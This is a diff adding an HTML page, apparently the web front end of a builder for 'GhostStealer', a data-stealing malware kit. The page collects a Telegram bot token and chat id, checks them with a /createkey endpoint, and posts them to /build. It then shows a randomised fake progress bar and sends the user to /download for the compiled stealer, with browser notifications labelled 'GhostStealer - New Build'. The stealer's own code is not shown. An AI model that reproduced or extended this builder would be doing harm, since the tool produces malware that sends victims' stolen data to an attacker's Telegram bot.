@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Build</title>
+
+    <link rel="stylesheet" href="/css/styles.css">
+    <link href='https://fonts.googleapis.com/css?family=Lato:400,100,300' rel='stylesheet' type='text/css'>
+    <link href="https://fonts.googleapis.com/css?family=Raleway:100,400,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Oswald:200,400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    <script src="https://use.fontawesome.com/20ab91acc4.js"></script>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        h1 {
+            padding: 20px !important;
+            text-align: center;
+        }
+
+        @import url(https://fonts.googleapis.com/css?family=Roboto:400,900italic,900,700italic,700,500italic,500,400italic,300italic,300,100italic,100);
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+        }
+
+        h1,
+        p,
+        h2,
+        h3,
+        h4,
+        ul,
+        li,
+        div {
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="block">
+        <a target="_blank" href="https://github.com/zougataga">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path
+                    d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+            </svg>
+        </a>
+    </div>
+    <div class="build">
+        <form class="cf">
+            <h1>BUILD</h1>
+            <input type="text" id="input-Token" placeholder="Token">
+            <input type="number" id="input-Chat" placeholder="Chat">
+            <input type="submit" value="Build" id="input-submit">
+        </form>
+    </div>
+    <div class="loading">
+        <div class="counter">
+            <p>loading</p>
+            <h1>0%
+            </h1>
+            <hr />
+        </div>
+    </div>
+
+    <script>
+        const
+            loading = document.querySelector(".loading"),
+            build = document.querySelector(".build"),
+            form = build.querySelector("form.cf"),
+            inputToken = form.querySelector("#input-Token"),
+            inputChat = form.querySelector("#input-Chat");
+
+        build.style.display = "flex";
+        inputToken.addEventListener("input", async () => {
+            const
+                token = inputToken.value.trim(),
+                chat = inputChat.value.trim(),
+                { isReal } = await createKeyBase64(token, chat);
+            console.log(isReal);
+            inputToken.class = "";
+            inputToken.classList.add(isReal?.token ? "yes" : "non");
+            inputToken.classList.remove(isReal?.token ? "non" : "yes");
+        });
+        inputChat.addEventListener("input", async () => {
+            const
+                token = inputToken.value.trim(),
+                chat = inputChat.value.trim(),
+                { isReal } = await createKeyBase64(token, chat);
+            inputChat.class = "";
+            inputChat.classList.add(isReal?.chat ? "yes" : "non");
+            inputChat.classList.remove(isReal?.chat ? "non" : "yes");
+        });
+        form.addEventListener("submit", async (ev) => {
+            ev.preventDefault();
+            const
+                token = inputToken.value.trim(),
+                chat = inputChat.value.trim(),
+                data = await createKeyBase64(token, chat);
+            if (data.type == 2) return alert("Please enter a bot token and a valid chat id telegram!");
+            else if (data.type == 1) {
+                build.style.display = "none";
+                loading.style.display = "flex";
+                if (!Notification) return;
+                if (Notification.permission !== 'granted') Notification.requestPermission();
+                const
+                    h1 = loading.querySelector('.counter h1'),
+                    xhr = new XMLHttpRequest();
+                // xhr.addEventListener("progress", (event) => {
+                //     if (event.lengthComputable) {
+                //         const percentComplete = (event.loaded / event.total) * 100;
+                //         console.log(`Upload progress: ${percentComplete}%`);
+                //         h1.innerHTML = `${percentComplete}%`;
+                //     }
+                // });
+                let count = 0;
+                const
+                    targetCount = 100,
+                    duration = 120000,
+                    randomIncrement = () => Math.random() * (2 - 0.5) + 0.5,
+                    random2 = () => Math.floor(Math.random() * (3 - 1 + 1)) + 1,
+                    intervalId = setInterval(async () => {
+                        await new Promise(resolve => setTimeout(() => resolve(true), random2() * 2000));
+                        if (random2() != 2) {
+                            h1.innerHTML = `${count.toFixed(1)}%`;
+                            count += randomIncrement();
+                            if (count.toFixed(0) == 99) {
+                                clearInterval(intervalId)
+                            }
+                        }
+                    }, 1000);
+                xhr.addEventListener("loadend", async () => {
+                    const { type, time, id } = JSON.parse(xhr.response);
+                    if (type == "1") {
+                        await notif(time, id);
+                        window.location.href = "/download?time=" + time + "&id=" + id;
+                    } else {
+                        alert("Error");
+                        await notif("err");
+                        window.location.reload();
+                    }
+                });
+                xhr.open("POST", "/build");
+                xhr.setRequestHeader("Content-Type", "application/json"); // set Content-Type header
+                xhr.send(JSON.stringify({ key: data.key }));
+            }
+        })
+
+        function notif(time, id) {
+            if (Notification.permission !== 'granted') return Notification.requestPermission();;
+            if (time == "err") {
+                new Notification('GhostStealer - New Build ❌', {
+                    // icon: '/img/sent.gif',
+                    body: `Build error`,
+                });
+                return;
+            };
+            const notification = new Notification('GhostStealer - New Build 👀', {
+                icon: '/img/sent.gif',
+                body: `Build Finished (${time})`,
+                // image: '/img/sent.gif',
+            });
+            notification.onclick = function () {
+                window.open("/download?time=" + time + "&id=" + id);
+            };
+        }
+        function createKeyBase64(token, chat) {
+            return new Promise(resolve => {
+                const request = new XMLHttpRequest();
+                request.open('GET', `/createkey?token=${token}&chat=${chat}`, true);
+                request.responseType = 'json';
+                request.onload = function () { resolve(request.status === 200 ? request.response : false) };
+                request.send();
+            })
+        }
+    </script>
+    <script src="/js/scripts.js"></script>
+
+</body>
+
+</html>
